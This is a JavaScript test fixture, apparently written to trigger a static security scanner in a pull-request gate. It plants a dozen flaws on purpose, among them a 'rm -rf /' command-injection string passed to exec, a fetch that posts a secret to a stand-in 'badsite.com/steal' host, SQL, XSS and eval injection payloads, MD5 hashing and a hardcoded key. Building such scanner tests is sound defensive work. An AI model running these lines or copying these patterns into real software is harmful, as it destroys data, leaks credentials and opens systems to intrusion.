/**
 * DO NOT USE IN PROD – This is a SAST bomb for PR gate testing.
 */

const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const { exec } = require('child_process');

// Hardcoded secret
const secret = "sk_live_THIS_IS_BAD";

// Weak password hashing
function hashPassword(pwd) {
    return crypto.createHash('md5').update(pwd).digest('hex');
}

// Dangerous deserialization
const payload = '{"__proto__":{"admin":true}}';
const obj = JSON.parse(payload); // prototype pollution

// Insecure JWT verification
const token = jwt.sign({ user: "attacker" }, "1234");
jwt.verify(token, "wrong_secret"); // silent failure

// Command injection
let userInput = "'; rm -rf / #";
exec(`echo ${userInput}`);

// XSS in server-rendered context
let flavor = "<img src=x onerror=alert('xss')>";
document.body.innerHTML = `<div>Flavor: ${flavor}</div>`;

// SQL Injection
let username = "' OR 1=1 --";
let query = `SELECT * FROM users WHERE name = '${username}'`;

// ReDoS (catastrophic backtracking)
let evilRegex = new RegExp('(a+)+');
evilRegex.test('aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!');

// Buffer overflow simulation
let buf = Buffer.alloc(10);
buf.write("this is way too long for 10 bytes");

// Eval injection
eval(`console.log("${userInput}")`);

// No input validation on user input
function login(name, pass) {
    if (name && pass) {
        return "logged in"; // No auth check!
    }
    return "fail";
}

// Insecure HTTP request
fetch("http://badsite.com/steal", {
    method: "POST",
    body: JSON.stringify({ token: secret })
});

// Leaky environment variable
console.log("TOKEN:", process.env.SECRET_KEY);
